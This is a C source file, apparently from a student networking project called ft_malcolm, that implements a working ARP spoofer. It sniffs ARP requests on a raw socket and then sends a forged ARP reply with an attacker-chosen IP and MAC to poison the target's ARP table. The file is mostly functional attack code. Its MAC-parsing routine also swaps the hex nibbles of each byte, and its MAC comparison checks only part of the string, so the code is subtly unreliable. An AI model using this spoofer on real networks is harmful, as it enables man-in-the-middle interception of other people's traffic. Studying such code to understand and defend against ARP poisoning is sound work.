#include "ft_malcolm.h"

int 	find_iface(void)
{
	struct ifaddrs *intf;
	uint32_t ip, netmask;
	uint32_t netaddr, tgt_netaddr;

	if(getifaddrs(&intf) < 0) {printf("Get interface address error: %s\n", strerror(errno)); return 1;}
	for(struct ifaddrs *ifa = intf; ifa != NULL; ifa = ifa->ifa_next)
	{
		if(ifa->ifa_addr->sa_family == AF_INET)
		{
			ft_memcpy(&ip, &ifa->ifa_addr->sa_data[2], 4);
			ft_memcpy(&netmask, &ifa->ifa_netmask->sa_data[2], 4);
			netaddr = ip & netmask;
			tgt_netaddr = inet_addr(args.tgt_ip) & netmask;
			if(netaddr == tgt_netaddr)
			{
				args.iface_name = ft_strdup(ifa->ifa_name);
				printf("Found available interface: \033[1;36m%s\033[0m\n", args.iface_name);
				break;
			}
		}
	}
	freeifaddrs(intf);
	return 0;
}

char*	ft_mac_ntoa(uint8_t *mac)
{
	char*	mac_str;

	mac_str = (char *)ft_calloc(18, sizeof(char));
	snprintf(mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x", \
			  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return mac_str;
}

int 	arp_req_unpacksniff(char *bff, etharp *arp_f)
{
	uint8_t target_ip_bin[4];
	char*	arpreq_mac_str;

	ft_memcpy(&arp_f->eth_hdr, bff, sizeof(struct ether_header));
	ft_memcpy(&arp_f->arp_hdr, &bff[14], sizeof(struct ether_arp));
	if(inet_pton(AF_INET, args.tgt_ip, target_ip_bin) < 0) {printf("Inet pton error: %s\n", strerror(errno)); return 2;}
	arpreq_mac_str = ft_mac_ntoa(arp_f->arp_hdr.arp_sha);

	if((ntohs(arp_f->arp_hdr.ea_hdr.ar_op) == 1) && (!ft_memcmp(target_ip_bin, arp_f->arp_hdr.arp_spa, 4)) && \
	    (!ft_strncmp(args.tgt_mac, arpreq_mac_str, 6)))
	{
		free(arpreq_mac_str);
		return 1;
	}
	free(arpreq_mac_str);
	return 0;
}

int 	wait_and_get_arp_req_pack(etharp *arp_frm) // sniffer
{
	struct sockaddr_ll sll;
	socklen_t sll_len;
	char buff[2048];
	int len, ctrl;

	sll_len = sizeof(sll);
	ft_memset(&sll, 0, sizeof(sll));
	printf("Sniffing ARP request packets, please wait...\n");
	while(1)
	{
		len = recvfrom(args.sockfd, buff, sizeof(buff), 0, (struct sockaddr *)&sll, &sll_len);
		if(len < 0) {printf("Receive error: %s\n", strerror(errno)); return 1;}
		ctrl = arp_req_unpacksniff(buff, arp_frm);
		if(ctrl == 1)
		{
			printf("an ARP request sniffed.\n");
			printf("	MAC address of request: ");
			for(int i = 0; i < 6; i++)
				printf("\033[1;36m%02x:\033[0m", arp_frm->arp_hdr.arp_sha[i]);
			printf("\n	IPv4 address of request: ");
			for(int i = 0; i < 4; i++)
		 		printf("\033[1;36m%d.\033[0m", arp_frm->arp_hdr.arp_spa[i]);
		 	printf("\n");
			break;
		}
		else if(ctrl == 2)
			return 1;
	}
	return 0;
}

void	eth_hdr_changer(etharp *arp_frm)
{
	uint8_t tmp_mac[ETH_ALEN];

	ft_memcpy(&tmp_mac, &arp_frm->eth_hdr.ether_dhost, 6);
	ft_memcpy(&arp_frm->eth_hdr.ether_dhost, &arp_frm->eth_hdr.ether_shost, 6);
	ft_memcpy(&arp_frm->eth_hdr.ether_shost, &tmp_mac, 6);
}

uint8_t*	ft_mac_aton(char* s)
{
	uint8_t* tmp_mac;
	char **ss;
	int i;
	uint8_t high, low;

	tmp_mac = (uint8_t *)ft_calloc(6, sizeof(uint8_t));
	ss = ft_split(s, ':');
	i = -1;
	while(ss[++i])
	{
		if(ss[i][1] >= '0' && ss[i][1] <= '9')
			low = ss[i][0] - '0';
		else if(ss[i][1] >= 'a' && ss[i][1] <= 'f')
			low = ss[i][0] - 'a' + 10;
		if(ss[i][0] >= '0' && ss[i][0] <= '9')
			high = (ss[i][1] - '0') * 16;
		else if(ss[i][0] >= 'a' && ss[i][0] <= 'f')
			high = ((ss[i][1] - 'a') + 10) * 16;
		tmp_mac[i] = high + low;
	}
	ft_leak_cleaner(ss);
	return tmp_mac;
}

int 	arp_hdr_changer(etharp *arp_frm)
{
	uint8_t *tmp_mac;

	arp_frm->arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
	ft_memcpy(&arp_frm->arp_hdr.arp_tha, &arp_frm->arp_hdr.arp_sha, 6);
	ft_memcpy(&arp_frm->arp_hdr.arp_tpa, &arp_frm->arp_hdr.arp_spa, 4);
	tmp_mac = ft_mac_aton(args.src_mac);
	ft_memcpy(&arp_frm->arp_hdr.arp_sha, tmp_mac, 6);
	if(inet_pton(AF_INET, args.src_ip, arp_frm->arp_hdr.arp_spa) < 0) 
	{printf("Inet pton error: %s\n", strerror(errno)); free(tmp_mac); return 1;}
	free(tmp_mac);
	return 0;
}

int 	arp_rep_packject(etharp *arp_frm) // spoofer/injector
{
	char arp_rep_pack[42];
	struct sockaddr_ll sll;
	socklen_t sll_len;

	ft_memset(&sll, 0, sizeof(sll));
	sll_len = sizeof(sll);
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_ifindex = if_nametoindex(args.iface_name);
	if(sll.sll_ifindex == 0) {printf("Nametoindex error: %s\n", strerror(errno)); return 1;}
	eth_hdr_changer(arp_frm);
	if(arp_hdr_changer(arp_frm)) {return 1;}
	ft_memcpy(arp_rep_pack, (char *)arp_frm, sizeof(*arp_frm));
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	sleep(9); // we wait for 9 sec because of Kernel ARP reply
	if(sendto(args.sockfd, arp_rep_pack, sizeof(arp_rep_pack), 0, (struct sockaddr *)&sll, sll_len) < 0)
	{printf("Send error: %s\n", strerror(errno)); return 1;}
	printf("Sent an ARP reply packet, you may now check the ARP table on the target.\nExiting program...\n");
	return 0;
}